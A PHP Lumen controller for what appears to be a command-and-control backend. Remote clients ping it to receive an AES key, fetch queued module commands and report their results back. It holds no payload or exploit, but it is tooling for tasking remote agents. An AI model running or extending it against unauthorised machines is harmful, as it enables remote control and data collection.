<?php

namespace App\Http\Controllers;

use App\Clients;
use App\Commands;
use App\Responses;
use Illuminate\Http\Request;

class Main extends Controller
{
	/**
	 * Can't name it since "dipatch" is a reserved name. From the main entry point, "handle" (ie dispatch) the request
	 *
	 * @param  Request  $request
	 * @return \Illuminate\Http\Response|\Laravel\Lumen\Http\ResponseFactory
	 */
	public function handle(Request $request)
	{
		$task      = strtolower($request->json()->get('task'));
		$client_id = $request->json()->get('client_id');

		if (!$client_id)
		{
			return response()->json(['error' => 'Forbidden'], 403);
		}

		switch ($task)
		{
			case 'ping':
				/** @var Clients $client */
				$client = Clients::where('client_id', $client_id)->first();

				// This should never happen, however...
				if (!$client)
				{
					return response()->json(['error' => 'Forbidden'], 403);
				}

				$aes_key = $client->aes_key;

				// No key? Let's create a new one on the fly
				if (!$aes_key)
				{
					$aes_key = md5(random_bytes(100));

					$client->aes_key = $aes_key;
					$client->save();
				}

				return response()->json([$aes_key]);

			case 'get_job':
				$response = [];
				$ids = [];
				$commands = Commands::where('client_id', $client_id)
									->where('sent_at', '0000-00-00 00:00:00')
									->orderBy('id', 'asc')
									->get();

				/** @var Commands $command */
				foreach ($commands as $command)
				{
					$ids[] = $command->id;
					$response[] = [
						'id'     => $command->id,
						'module' => $command->module,
						'cmd'    => $command->command
					];
				}

				if ($ids)
				{
					Commands::whereIn('id', $ids)->update(['sent_at' => date('Y-m-d H:i:s')]);
				}

				return response()->json($response);

			case 'report_job':
				$reports  = $request->json()->get('reports');

				if (!$reports)
				{
					return response()->json('');
				}

				foreach ($reports as $report)
				{
					$report = json_decode($report);

					Responses::create([
						'client_id'  => $client_id,
						'module'     => $report->module,
						'command_id' => isset($report->cmd_id) ? $report->cmd_id : 0,
						'response'   => $report->result,
						'created_at' => date('Y-m-d H:i:s')
					]);
				}

				return response()->json('');
		}

		return response()->json(['error' => 'Forbidden'], 403);
	}
}